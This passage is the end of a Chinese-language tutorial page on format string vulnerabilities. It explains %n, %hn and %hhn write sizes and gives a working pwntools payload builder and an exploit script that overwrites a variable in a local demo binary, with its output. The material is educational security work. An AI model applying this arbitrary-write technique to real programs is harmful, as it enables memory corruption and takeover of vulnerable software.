+<pre class="code-block language-sh" data-language="SH"><button class="code-copy" type="button" data-copy-code>Copy</button><code class="hljs language-sh">addr \x78
+addr + 1 \x56
+addr + 2 \x34
+addr + 3 \x12
+</code></pre>
+<p>但是要注意<code>%n</code>写入的是整型的大小，但是我们可以通过设置格式化字符串的<code>[length]</code>来设置控制写入的大小：</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">格式化符</th>
+<th style="text-align:left">写入大小</th>
+<th style="text-align:left">类型对应</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left"><code>%n</code></td>
+<td style="text-align:left"><strong>4 字节</strong> (32位) / <strong>8 字节</strong> (64位)</td>
+<td style="text-align:left"><code>int*</code></td>
+</tr>
+<tr>
+<td style="text-align:left"><code>%hn</code></td>
+<td style="text-align:left"><strong>2 字节</strong></td>
+<td style="text-align:left"><code>short*</code></td>
+</tr>
+<tr>
+<td style="text-align:left"><code>%hhn</code></td>
+<td style="text-align:left"><strong>1 字节</strong></td>
+<td style="text-align:left"><code>char*</code></td>
+</tr>
+</tbody>
+</table>
+<p>这样我们就可以通过<code>%hhn</code>来在每个字节进行一定的写入。最终我们可以构造出<code>payload</code>：</p>
+<pre class="code-block language-sh" data-language="SH"><button class="code-copy" type="button" data-copy-code>Copy</button><code class="hljs language-sh">[addr[0]][addr[1]][addr[2]][addr[3]] + 
+[padding0]%[offset]<span class="hljs-variable">$hhn</span> + 
+[padding1]%[offset+1]<span class="hljs-variable">$hhn</span> + 
+[padding2]%[offset+2]<span class="hljs-variable">$hhn</span> +
+[padding3]%[offset+3]<span class="hljs-variable">$hhn</span>
+</code></pre>
+<p>所以关键就在于怎么计算出合适的<code>paddding</code>和正确的<code>offset</code> offset的计算不用多说，对于<code>padding</code>的计算我们可以用一个程序的结构帮助我们计算出来：（自己意会，逻辑很清晰）</p>
+<pre class="code-block language-py" data-language="PY"><button class="code-copy" type="button" data-copy-code>Copy</button><code class="hljs language-py"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">fmt</span>(<span class="hljs-params">prev, byte, idx</span>):
+    <span class="hljs-string">&#x27;&#x27;&#x27;
+    prev: 在此之前的字符数
+    byte: 需要写入的字节
+    idx: 需要写入的地址在参数列表中的位置
+    &#x27;&#x27;&#x27;</span>
+    <span class="hljs-keyword">if</span> prev &lt; byte:
+        fmtstr = <span class="hljs-string">b&#x27;%&#x27;</span> + <span class="hljs-built_in">str</span>(byte - prev).encode() + <span class="hljs-string">b&#x27;c%&#x27;</span> 
+    <span class="hljs-keyword">elif</span> prev &gt; byte:
+        fmtstr = <span class="hljs-string">b&#x27;%&#x27;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-number">0x100</span> + byte - prev).encode() + <span class="hljs-string">b&#x27;c%&#x27;</span>
+    <span class="hljs-keyword">else</span>:
+        fmtstr = <span class="hljs-string">b&#x27;&#x27;</span>
+
+    fmtstr += <span class="hljs-built_in">str</span>(idx).encode() + <span class="hljs-string">b&#x27;$hhn&#x27;</span>
+    <span class="hljs-keyword">return</span> fmtstr  
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">fmt_str</span>(<span class="hljs-params">offset, size, addr, target</span>):
+    <span class="hljs-string">&#x27;&#x27;&#x27;
+    offset: 需要写入的地址在参数列表中的位置
+    size: 需要写入的字节数
+    addr: 需要写入的地址
+    target: 需要写入的值
+    &#x27;&#x27;&#x27;</span>
+    payload = <span class="hljs-string">b&#x27;&#x27;</span>
+    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(size):
+        <span class="hljs-keyword">if</span> size == <span class="hljs-number">4</span>:
+            payload += p32(addr + i)
+        <span class="hljs-keyword">elif</span> size == <span class="hljs-number">8</span>:
+            payload += p64(addr + i)
+    prev = <span class="hljs-built_in">len</span>(payload)
+    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(size):
+        payload += fmt(prev, (target &gt;&gt; i*<span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xff</span>, offset + i)
+        prev = (target &gt;&gt; i*<span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xff</span>
+    <span class="hljs-keyword">return</span> payload 
+</code></pre>
+<p>我们可以写出exp:</p>
+<pre class="code-block language-python" data-language="PYTHON"><button class="code-copy" type="button" data-copy-code>Copy</button><code class="hljs language-python">p = process(<span class="hljs-string">&#x27;./a.out&#x27;</span>)
+
+var = p.recv().split(<span class="hljs-string">b&#x27;.&#x27;</span>)
+a,b,c = <span class="hljs-built_in">int</span>(var[<span class="hljs-number">0</span>], <span class="hljs-number">16</span>), <span class="hljs-built_in">int</span>(var[<span class="hljs-number">1</span>], <span class="hljs-number">16</span>), <span class="hljs-built_in">int</span>(var[<span class="hljs-number">2</span>], <span class="hljs-number">16</span>)
+
+payload = fmt_str(<span class="hljs-number">6</span>, <span class="hljs-number">4</span>, b, <span class="hljs-number">0x12345678</span>)
+p.sendline(payload)
+
+<span class="hljs-built_in">print</span>(p.recv())
+</code></pre>
+<p>执行结果输出<code>modified b for a big number!</code>，实现了大数字的写入：</p>
+<pre class="code-block language-sh" data-language="SH"><button class="code-copy" type="button" data-copy-code>Copy</button><code class="hljs language-sh">&gt; python3 exp.py
+[+] Starting <span class="hljs-built_in">local</span> process <span class="hljs-string">&#x27;./a.out&#x27;</span>: pid 19143
+b<span class="hljs-string">&#x27;\x1c\xc0\x04\x08\x1d\xc0\x04\x08\x1e\xc0\x04\x08\x1f\xc0\x04\x08                                                                                                       \xd8                                                                                                                                                                                                                             \x1c                                                                                                                                                                                                                             &lt;                                                                                                                                                                                                                             \\modified b for a big number!\n&#x27;</span>
+[*] Process <span class="hljs-string">&#x27;./a.out&#x27;</span> stopped with <span class="hljs-built_in">exit</span> code 0 (pid 19143)
+</code></pre>
+<p>至此对格式化字符串漏洞的介绍和用法就到此为止了。</p>
+
+
+<nav class="pager">
+  
+    <a class="pager__link pager__link--prev" href="../122-PWN-1/index.html">prev</a>
+  
+  <a class="pager__link pager__link--home" href="../../index.html">home</a>
+  
+    <a class="pager__link pager__link--next" href="../124-深入理解Ptmalloc机制-上/index.html">next</a>
+  
+</nav>
+
+</article>
+          <footer class="site-footer">
+  <div class="site-footer__inner">
+    <span>Articles: 132</span>
+    <span>Words: 289963</span>
+  </div>
+</footer>
+
+        </section>
+        <aside class="layout__sidebar">
+          <div class="toc-panel">
+  <h2 class="toc-panel__title">目录</h2>
+  
+  
+  
+    <nav class="toc" aria-label="Contents"><ol class="toc__list">
+  
+    <li class="toc__item toc__item--level-2">
+      
+        <details class="toc__folder">
+          <summary class="toc__target toc__summary" data-slug="格式化字符串漏洞">格式化字符串漏洞</summary>
+          <ol class="toc__list">
+  
+    <li class="toc__item toc__item--level-3">
+      
+        <details class="toc__folder">
+          <summary class="toc__target toc__summary" data-slug="格式化字符串函数">格式化字符串函数</summary>
+          <ol class="toc__list">
+  
+    <li class="toc__item toc__item--level-4">
+      
+        <a class="toc__target toc__link" href="#格式化字符串" data-slug="格式化字符串">格式化字符串</a>
+      
+    </li>
+  
+    <li class="toc__item toc__item--level-4">
+      
+        <a class="toc__target toc__link" href="#printf函数运行机理" data-slug="printf函数运行机理">printf函数运行机理</a>
+      
+    </li>
+  
+    <li class="toc__item toc__item--level-4">
+      
+        <a class="toc__target toc__link" href="#演示" data-slug="演示">演示</a>
+      
+    </li>
+  
+</ol>
+        </details>
+      
+    </li>
+  
+    <li class="toc__item toc__item--level-3">
+      
+        <details class="toc__folder">
+          <summary class="toc__target toc__summary" data-slug="格式化字符串漏洞利用">格式化字符串漏洞利用</summary>
+          <ol class="toc__list">
+  
+    <li class="toc__item toc__item--level-4">
+      
+        <a class="toc__target toc__link" href="#程序崩溃" data-slug="程序崩溃">程序崩溃</a>
+      
+    </li>
+  
+    <li class="toc__item toc__item--level-4">
+      
+        <a class="toc__target toc__link" href="#泄露内存" data-slug="泄露内存">泄露内存</a>
+      
+    </li>
+  
+    <li class="toc__item toc__item--level-4">
+      
+        <a class="toc__target toc__link" href="#覆盖内存" data-slug="覆盖内存">覆盖内存</a>
+      
+    </li>
+  
+</ol>
+        </details>
+      
+    </li>
+  
+</ol>
+        </details>
+      
+    </li>
+  
+</ol></nav>
+  
+
+</div>
+
+        </aside>
+      </main>
+    </div>
+  </div>
+<script src="../../assets/site.js" defer></script>
+
+</body>
+
+</html>
